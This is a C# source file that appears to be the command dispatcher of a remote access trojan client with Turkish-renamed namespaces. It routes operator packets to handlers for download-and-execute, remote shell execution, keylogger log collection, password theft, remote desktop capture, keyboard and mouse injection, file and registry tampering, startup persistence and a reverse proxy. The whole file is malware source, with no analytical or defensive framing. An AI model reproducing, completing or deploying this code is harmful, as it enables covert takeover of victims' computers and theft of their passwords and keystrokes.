using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Eylemler;
using xClient.KuuhakuÇekirdek.ReverseProxy;

namespace xClient.KuuhakuÇekirdek.Paketler
{
    public static class PacketHandler
    {
        public static void HandlePacket(Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (type == typeof(ServerPaketleri.DoDownloadAndExecute))
            {
                Eylemİşleyicisi.HandleDoDownloadAndExecute((ServerPaketleri.DoDownloadAndExecute)packet,
                    client);
            }
            else if (type == typeof(ServerPaketleri.DoUploadAndExecute))
            {
                Eylemİşleyicisi.HandleDoUploadAndExecute((ServerPaketleri.DoUploadAndExecute)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoClientDisconnect))
            {
                Program.ConnectClient.Exit();
            }
            else if (type == typeof(ServerPaketleri.DoClientReconnect))
            {
                Program.ConnectClient.Disconnect();
            }
            else if (type == typeof(ServerPaketleri.DoClientUninstall))
            {
                Eylemİşleyicisi.HandleDoClientUninstall((ServerPaketleri.DoClientUninstall)packet, client);
            }
            else if (type == typeof(ServerPaketleri.GetDesktop))
            {
                Eylemİşleyicisi.HandleGetDesktop((ServerPaketleri.GetDesktop)packet, client);
            }
            else if (type == typeof(ServerPaketleri.GetProcesses))
            {
                Eylemİşleyicisi.HandleGetProcesses((ServerPaketleri.GetProcesses)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoProcessKill))
            {
                Eylemİşleyicisi.HandleDoProcessKill((ServerPaketleri.DoProcessKill)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoProcessStart))
            {
                Eylemİşleyicisi.HandleDoProcessStart((ServerPaketleri.DoProcessStart)packet, client);
            }
            else if (type == typeof(ServerPaketleri.GetDrives))
            {
                Eylemİşleyicisi.HandleGetDrives((ServerPaketleri.GetDrives)packet, client);
            }
            else if (type == typeof(ServerPaketleri.GetDirectory))
            {
                Eylemİşleyicisi.HandleGetDirectory((ServerPaketleri.GetDirectory)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoDownloadFile))
            {
                Eylemİşleyicisi.HandleDoDownloadFile((ServerPaketleri.DoDownloadFile)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoUploadFile))
            {
                Eylemİşleyicisi.HandleDoUploadFile((ServerPaketleri.DoUploadFile)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoMouseEvent))
            {
                Eylemİşleyicisi.HandleDoMouseEvent((ServerPaketleri.DoMouseEvent)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoKeyboardEvent))
            {
                Eylemİşleyicisi.HandleDoKeyboardEvent((ServerPaketleri.DoKeyboardEvent)packet, client);
            }
            else if (type == typeof(ServerPaketleri.GetSystemInfo))
            {
                Eylemİşleyicisi.HandleGetSystemInfo((ServerPaketleri.GetSystemInfo)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoVisitWebsite))
            {
                Eylemİşleyicisi.HandleDoVisitWebsite((ServerPaketleri.DoVisitWebsite)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoShowMessageBox))
            {
                Eylemİşleyicisi.HandleDoShowMessageBox((ServerPaketleri.DoShowMessageBox)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoClientUpdate))
            {
                Eylemİşleyicisi.HandleDoClientUpdate((ServerPaketleri.DoClientUpdate)packet, client);
            }
            else if (type == typeof(ServerPaketleri.GetMonitors))
            {
                Eylemİşleyicisi.HandleGetMonitors((ServerPaketleri.GetMonitors)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoShellExecute))
            {
                Eylemİşleyicisi.HandleDoShellExecute((ServerPaketleri.DoShellExecute)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoPathRename))
            {
                Eylemİşleyicisi.HandleDoPathRename((ServerPaketleri.DoPathRename)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoPathDelete))
            {
                Eylemİşleyicisi.HandleDoPathDelete((ServerPaketleri.DoPathDelete)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoShutdownAction))
            {
                Eylemİşleyicisi.HandleDoShutdownAction((ServerPaketleri.DoShutdownAction)packet, client);
            }
            else if (type == typeof(ServerPaketleri.GetStartupItems))
            {
                Eylemİşleyicisi.HandleGetStartupItems((ServerPaketleri.GetStartupItems)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoStartupItemAdd))
            {
                Eylemİşleyicisi.HandleDoStartupItemAdd((ServerPaketleri.DoStartupItemAdd)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoStartupItemRemove))
            {
                Eylemİşleyicisi.HandleDoStartupItemRemove((ServerPaketleri.DoStartupItemRemove)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoDownloadFileCancel))
            {
                Eylemİşleyicisi.HandleDoDownloadFileCancel((ServerPaketleri.DoDownloadFileCancel)packet,
                    client);
            }
            else if (type == typeof(ServerPaketleri.DoLoadRegistryKey))
            {
                Eylemİşleyicisi.HandleGetRegistryKey((ServerPaketleri.DoLoadRegistryKey)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoCreateRegistryKey))
            {
                Eylemİşleyicisi.HandleCreateRegistryKey((ServerPaketleri.DoCreateRegistryKey)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoDeleteRegistryKey))
            {
                Eylemİşleyicisi.HandleDeleteRegistryKey((ServerPaketleri.DoDeleteRegistryKey)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoRenameRegistryKey))
            {
                Eylemİşleyicisi.HandleRenameRegistryKey((ServerPaketleri.DoRenameRegistryKey)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoCreateRegistryValue))
            {
                Eylemİşleyicisi.HandleCreateRegistryValue((ServerPaketleri.DoCreateRegistryValue)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoDeleteRegistryValue))
            {
                Eylemİşleyicisi.HandleDeleteRegistryValue((ServerPaketleri.DoDeleteRegistryValue)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoRenameRegistryValue))
            {
                Eylemİşleyicisi.HandleRenameRegistryValue((ServerPaketleri.DoRenameRegistryValue)packet, client);
            }
            else if (type == typeof(ServerPaketleri.DoChangeRegistryValue))
            {
                Eylemİşleyicisi.HandleChangeRegistryValue((ServerPaketleri.DoChangeRegistryValue)packet, client);
            }
            else if (type == typeof(ServerPaketleri.GetKeyloggerLogs))
            {
                Eylemİşleyicisi.HandleGetKeyloggerLogs((ServerPaketleri.GetKeyloggerLogs)packet, client);
            }
            else if (type == typeof(ServerPaketleri.GetPasswords))
            {
                Eylemİşleyicisi.HandleGetPasswords((ServerPaketleri.GetPasswords)packet, client);
            }
            else if (type == typeof(ReverseProxy.Packets.ReverseProxyConnect) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyConnectResponse) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyData) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyDisconnect))
            {
                ReverseProxyCommandHandler.HandleCommand(client, packet);
            }
        }
    }
}
